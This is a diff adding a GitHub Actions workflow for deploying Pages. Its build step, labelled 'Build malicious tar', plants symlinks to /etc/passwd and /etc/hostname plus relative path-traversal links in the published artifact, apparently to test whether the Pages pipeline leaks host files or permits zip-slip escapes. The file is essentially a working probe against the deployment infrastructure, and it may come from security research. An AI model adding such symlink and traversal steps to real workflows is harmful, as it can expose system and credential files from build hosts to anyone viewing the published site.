@@ -1,0 +1,43 @@
+name: Deploy Pages
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+concurrency:
+  group: pages
+  cancel-in-progress: true
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build malicious tar
+        run: |
+          mkdir -p out
+          echo "<h1>BENIGN INDEX</h1>" > out/index.html
+          # Create a tarball with symlinks/path traversal entries
+          cd out
+          # 1. Symlink leak attempt
+          ln -s /etc/passwd passwd_link.html || true
+          ln -s /etc/hostname hostname_link.html || true
+          ln -s ../../../etc/passwd rel_passwd.html || true
+          # 2. Path traversal in tar entries (zip slip)
+          mkdir -p evil
+          echo "ESCAPED" > evil/escaped.html
+          ls -la
+      - uses: actions/upload-pages-artifact@v3
+        with:
+          path: out
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - id: deployment
+        uses: actions/deploy-pages@v4
